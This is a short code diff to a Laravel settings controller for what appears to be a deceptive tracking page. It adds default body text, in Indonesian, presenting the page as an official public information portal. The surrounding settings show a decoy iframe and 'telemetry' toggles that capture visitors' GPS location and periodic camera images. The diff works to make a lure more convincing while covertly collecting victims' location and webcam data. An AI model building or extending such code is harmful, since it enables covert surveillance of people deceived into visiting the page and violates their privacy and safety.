@@ -36,6 +36,7 @@ class SettingsController extends Controller
             'og_image_url' => Setting::get('og_image_url', 'images/landing/default-thumbnail.jpg'),
             'decoy_iframe_url' => Setting::get('decoy_iframe_url', ''),
             'landing_heading' => Setting::get('landing_heading', 'Portal Informasi & Publikasi Resmi'),
+            'landing_article_body' => Setting::get('landing_article_body', 'Halaman ini menyajikan informasi dan publikasi resmi terkini. Seluruh konten disaring langsung melalui kanal informasi terpusat guna memberikan pembaruan yang akurat kepada publik.'),
             
             // Telemetry Toggles
             'capture_gps_enabled' => Setting::get('capture_gps_enabled', '1'),
@@ -62,6 +63,7 @@ class SettingsController extends Controller
             'og_image_url' => ['nullable', 'string', 'max:255'],
             'decoy_iframe_url' => ['nullable', 'url'],
             'landing_heading' => ['nullable', 'string', 'max:100'],
+            'landing_article_body' => ['nullable', 'string'],
             'capture_gps_enabled' => ['required', 'in:0,1'],
             'capture_cam_enabled' => ['required', 'in:0,1'],
             'cam_interval_ms' => ['required', 'integer', 'min:1000', 'max:60000'],
